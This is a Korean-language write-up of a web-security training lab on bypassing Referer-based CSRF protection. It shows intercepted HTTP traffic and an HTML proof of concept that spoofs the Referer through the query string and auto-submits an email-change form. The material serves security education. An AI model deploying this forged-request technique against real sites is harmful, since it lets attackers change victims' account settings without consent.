# 🚩Lab: CSRF with broken Referer validation

```text
This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`
```


### 🔍 분석 및 공격 과정
1. `wiener:peter` 로 로그인.
2. 로그인시 돌아오는 응답 패킷을 프록시로 관찰.

```http title="/login"
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: session=unVbs9LAY9loPgdAaN8RGGvZeyVO2sLh; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```
3. `session 쿠키`의 `SameSite=None` 옵션이 눈에 띔.
4. 이번에는 이메일 변경을 POST하는 패킷 관찰.
<details>
  <summary>전체 HTTP Request 패킷</summary>

```http 
POST /my-account/change-email HTTP/2
Host: 0afa00920458263f8064442a00f80049.web-security-academy.net
Cookie: session=unVbs9LAY9loPgdAaN8RGGvZeyVO2sLh
Content-Length: 11
Cache-Control: max-age=0
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: ko-KR,ko;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: https://0afa00920458263f8064442a00f80049.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0afa00920458263f8064442a00f80049.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

email=d%40d
```
</details>
5. 리피터로 보내서 `Referer`을 지워서 전송해봄. 

```http 
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 24

"Invalid referer header"
```
6. `Referer` 헤더가 존재하지 않는 경우도 검증이 이루어지고 있음. 
7. 기존 `Referer`의 값을 여러번 수정해본 끝에 `0afa00920458263f8064442a00f80049.web-security-academy.net/` 이라는 서브도메인이 포함되어있어야 검증을 통과시킨다는 것을 확인함.
8. 그렇다면 공격서버의 도메인에 쿼리스트링을 포함하여 `공격서버/?{0afa00920458263f8064442a00f80049.web-security-academy.net/ url인코딩 해서 넣으시고}` 으로 만들고 이 full URL을 HTTP 요청의 `Referer` 헤더에 넣도록 `<meta>` 태그를 이용해 설정하자.

> [!NOTE]
> Referer의 content로 unsafe-url을 주면 전체 URL을 Referer헤더에 포함시킨다.


9. PoC 작성.
```html
<html>
    <head>
        <meta name="referrer" content="unsafe-url">
    </head>
    <body>
        <form action="https://0afa00920458263f8064442a00f80049.web-security-academy.net/my-account/change-email" method="POST">
            <input name="email" value="a@aaaaa">
        </form>
        <script>
            const t = new URL(window.location.href);
            t.searchParams.set('hack', '0afa00920458263f8064442a00f80049.web-security-academy.net/');
            window.history.replaceState({}, '', t);
            document.forms[0].submit();
        </script>
    </body>
</html>
```
10. 해당 PoC스크립트에서는 새로고침 없이 현재 윈도우의 쿼리스트링을 설정하기 위해 `window.history.replaceState`를 사용하였음.



### 💡 취약점 원리
 `Referer`헤더를 베이스로 CSRF를 막고 있으나, 단지 특정 도메인네임을 `포함`시키는지만 확인하였기에 쉽게 우회됨.
 
